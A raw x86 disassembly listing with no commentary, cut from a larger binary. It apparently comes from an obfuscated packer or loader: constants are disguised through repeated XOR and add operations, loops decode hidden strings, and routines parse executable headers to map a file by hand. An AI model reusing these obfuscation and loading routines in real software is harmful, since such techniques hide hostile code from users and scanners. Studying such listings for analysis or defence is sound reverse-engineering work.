  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
